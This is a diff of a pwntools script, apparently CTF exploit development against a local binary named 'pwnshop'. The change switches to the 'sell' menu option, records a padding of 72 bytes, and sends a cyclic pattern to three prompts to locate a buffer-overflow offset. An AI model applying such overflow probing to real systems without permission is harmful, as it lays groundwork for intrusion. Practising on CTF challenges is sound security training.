@@ -5,27 +5,31 @@ context(os='linux', arch='amd64')
 
 executable = '/home/kali/Downloads/pwnshop'
 
-elf = context.binary = ELF(executable)
+buy_padding = 72
+
+#elf = context.binary = ELF(executable)
 
 log.info('Get Addresses')
 
-info("%s symbols", elf.symbols)
-info("%s plt", elf.plt)
-info("%s got", elf.got)
-info("%s libs", elf.libs)
+#info("%s symbols", elf.symbols)
+#info("%s plt", elf.plt)
+#info("%s got", elf.got)
+#info("%s libs", elf.libs)
 
 
 log.info('Create IO')
 #io = remote('', )
 io = process(executable)
 
-log.info('Send Command buy')
-io.sendlineafter('>', '1')
+log.info('Send Command')
+io.sendlineafter('>', '2')
 
 payload = cyclic(200)
 
 log.info('Send Payload')
-io.sendlineafter('details: ', payload)
+io.sendlineafter('sell? ', payload)
+io.sendlineafter('it? ', payload)
+io.sendlineafter('what? ', payload)
 
 io.wait()
 
